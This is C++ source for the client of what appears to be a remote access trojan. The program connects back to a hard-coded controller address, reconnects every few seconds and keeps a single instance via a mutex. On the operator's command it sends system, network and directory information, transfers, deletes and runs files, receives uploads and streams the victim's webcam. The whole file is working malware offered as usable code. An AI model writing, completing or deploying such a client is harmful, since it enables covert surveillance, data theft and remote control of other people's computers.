#define WIN32_LEAN_AND_MEAN
#include <iostream>
#include <winsock2.h>
#include <chrono>
#include <thread>
#include "video_audio/DeviceEnumerator.h"
#include <string>
#include <filesystem>
#include "stream/Stream.h"
#include "download/Download.h"
#include "file/FileManager.h"
#include "information/system/SystemInformation.h"
#include "information/network/NetworkInformation.h"

#define IP "192.168.82.182"

#define PORT 3055

#define TAG_NAME "Client 1"

#define MUTEX "ed5c02e5-b38a-4e36-bcd8-8c22d35235a9"

#define TIMING_RETRY 10000

#define WEBCAM

#ifdef WEBCAM
#include "webcam/WebcamManager.h"
#endif



// new comment 2
// g++ Client.cpp  SystemInformation.cpp -o exec -lwsock32
// g++ Client.cpp  SystemInformation.cpp -o exec -lwsock32 -lwininet
// g++ Client.cpp  SystemInformation.cpp NetworkInformation.cpp -o exec
// -lwsock32 -lwininet -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic

// final

/* Without camera
 * g++  -I opencv/include  -L opencv/lib Client 1.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -lopencv_core460 -lopencv_videoio460 -lopencv_imgcodecs460 -lwsock32 -lWininet -lole32 -loleaut32 -o Client 1
 */

/* With camera
 * g++ Client 1.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -IC:/opencv_static/mingw-build/install/include -LC:/opencv_static/mingw-build/install/x64/mingw/staticlib -lopencv_gapi460 -lopencv_highgui460 -lopencv_ml460 -lopencv_objdetect460 -lopencv_photo460 -lopencv_stitching460 -lopencv_video460 -lopencv_calib3d460 -lopencv_features2d460 -lopencv_dnn460 -lopencv_flann460 -lopencv_videoio460 -lopencv_imgcodecs460 -lopencv_imgproc460 -lopencv_core460 -llibprotobuf -lade -llibjpeg-turbo -llibwebp -llibpng -llibtiff -llibopenjp2 -lIlmImf -lzlib -lquirc -lwsock32 -lcomctl32 -lgdi32 -lole32 -lsetupapi -lws2_32  -loleaut32 -luuid -lcomdlg32 -lwininet -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -o exec
 *
 * Inside repository
 *  g++ Client 1.cpp video_audio/DeviceEnumerator.cpp webcam/WebcamManager.cpp stream/Stream.cpp  time/Time.cpp  converter/Converter.cpp download/Download.cpp file/FileManager.cpp  information/system/SystemInformation.cpp  information/network/NetworkInformation.cpp -IC:opencv_static/include -Lopencv_static/lib -lopencv_gapi460 -lopencv_highgui460 -lopencv_ml460 -lopencv_objdetect460 -lopencv_photo460 -lopencv_stitching460 -lopencv_video460 -lopencv_calib3d460 -lopencv_features2d460 -lopencv_dnn460 -lopencv_flann460 -lopencv_videoio460 -lopencv_imgcodecs460 -lopencv_imgproc460 -lopencv_core460 -llibprotobuf -lade -llibjpeg-turbo -llibwebp -llibpng -llibtiff -llibopenjp2 -lIlmImf -lzlib -lquirc -lwsock32 -lcomctl32 -lgdi32 -lole32 -lsetupapi -lws2_32  -loleaut32 -luuid -lcomdlg32 -lwininet -static-libgcc -static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -o exec
 */


int main() {
    HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
    if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
        bool connectionState = true;
        while (connectionState) {
            std::cout << "trying to connect " << std::endl;
            WSADATA WSAData;
            WSAStartup(MAKEWORD(2, 0), &WSAData);
            SOCKET sock;
            SOCKADDR_IN sin;
            sin.sin_addr.s_addr = inet_addr(IP);
            sin.sin_family = AF_INET;
            sin.sin_port = htons(PORT);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            bool streamListening = true;
            if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) != SOCKET_ERROR) {
                std::cout << "Connected to server!" << std::endl;
                Stream stream(sock);
                while (streamListening) {
                    int action = stream.readSize();
                    switch (action) {
                        case -1:{
                            streamListening=false;
                        }
                        case 0: {
                            std::cout << "GATHERING SYSTEM INFORMATION" << std::endl;
                            std::vector<std::string> informationVector = SystemInformation::getSystemInformation();
                            informationVector.emplace_back(TAG_NAME);
                            stream.sendList(informationVector);
                            break;
                        }
                        case 1: {
                            std::cout << "GATHERING NETWORK INFORMATION " << std::endl;
                            std::string networkJSON = NetworkInformation::requestNetworkInformation();
                            stream.sendString(networkJSON.c_str());
                            break;
                        }
                        case 2: {
                            std::cout << "JSON FOR READING DISKS" << std::endl;
                            stream.sendList(SystemInformation::getDisks());
                            break;
                        }
                        case 3: {
                            std::cout << "READING ALL" << std::endl;
                            std::string path = stream.readString();
                            std::cout << "Path -> " << path << std::endl;
                            std::string folderVector = FileManager::readDirectory(std::filesystem::u8path(path), true,
                                                                                  false);
                            std::string fileVector = FileManager::readDirectory(std::filesystem::u8path(path), false,
                                                                                true);
                            folderVector.append(fileVector);
                            std::cout << folderVector << std::endl;
                            stream.sendString(folderVector.c_str());
                            break;
                        }
                        case 4: {
                            std::cout << "READING ONLY DIRECTORIES" << std::endl;
                            std::string path = stream.readString();
                            std::string vectorOfFiles = FileManager::readDirectory(std::filesystem::u8path(path), true,
                                                                                   false);
                            stream.sendString(vectorOfFiles.c_str());
                            break;
                        }
                        case 5: {
                            std::cout << "DOWNLOADING" << std::endl;
                            std::vector<std::string> fileList = stream.readList();
                            Download download(stream, fileList);
                            download.start();
                            break;
                        }
                        case 6: {
                            std::cout << "COPYING" << std::endl;
                            std::vector<std::string> vectorOfFiles = stream.readList();
                            std::vector<std::string> vectorOfDirectories = stream.readList();
                            FileManager::copyFiles(vectorOfFiles, vectorOfDirectories);
                            break;
                        }
                        case 7: {
                            std::cout << "MOVING" << std::endl;
                            std::vector<std::string> vectorOfFiles = stream.readList();
                            std::string directory = stream.readString();
                            FileManager::moveFiles(vectorOfFiles, directory);
                            break;
                        }
                        case 8: {
                            std::cout << "DELETING" << std::endl;
                            std::vector<std::string> vectorOfFiles = stream.readList();
                            FileManager::deleteFiles(vectorOfFiles);
                            break;
                        }
                        case 9: {
                            std::cout << "RUNNING FILES" << std::endl;
                            std::vector<std::string> vectorOfFiles = stream.readList();
                            FileManager::runFiles(vectorOfFiles);
                            break;
                        }
                        case 10: {
                            std::cout << "UPLOADING FILES" << std::endl;
                            std::vector<std::string> vectorOfFiles = stream.readList();
                            int numOfFiles = stream.readSize();

                            for (int i = 0; i < numOfFiles; i++) {
                                stream.readFile(vectorOfFiles);
                            }
                            break;
                        }
                        case 16: {
                            std::cout << "REQUEST DEVICES (CAMERA)" << std::endl;
                            DeviceEnumerator de;
                            std::map<int, Device> devices = de.getVideoDevicesMap();
                            std::vector<std::string> webcamVector;
                            for (auto const &device: devices) {
                                std::cout << "== AUDIO DEVICE (id:" << device.first << ") ==" << std::endl;
                                std::cout << "Name: " << device.second.deviceName << std::endl;
                                std::cout << "Path: " << device.second.devicePath << std::endl;
                                webcamVector.push_back(device.second.deviceName);
                            }
                            stream.sendList(webcamVector);
                            break;
                        }
                        case 17: {
                        #ifdef WEBCAM
                            std::cout << "START WEBCAM" << std::endl;
                            std::string webcamName = stream.readString();
                            bool fragmented = stream.readSize();
                            int FPS = stream.readSize();
                            DeviceEnumerator de;

                            std::map<int, Device> devices = de.getVideoDevicesMap();
                            for (auto &device: devices) {
                                std::cout << "== AUDIO DEVICE (id:" << device.first << ") ==" << std::endl;
                                std::cout << "Name: " << device.second.deviceName << std::endl;
                                std::cout << "Path: " << device.second.devicePath << std::endl;
                                if (device.second.deviceName == webcamName) {
                                    WebcamManager webcam(stream, device.first, fragmented, FPS);
                                    webcam.startWebcam();
                                }
                            }
                            #endif
                            break;

                        }
                        default: {
                            streamListening = false;
                            break;
                        }
                    }
                }
                closesocket(sock);
            }
            WSACleanup();
            std::this_thread::sleep_for(std::chrono::milliseconds(TIMING_RETRY));
        }
    }

    ReleaseMutex(hMutexHandle);
    CloseHandle(hMutexHandle);
    return 0;


}
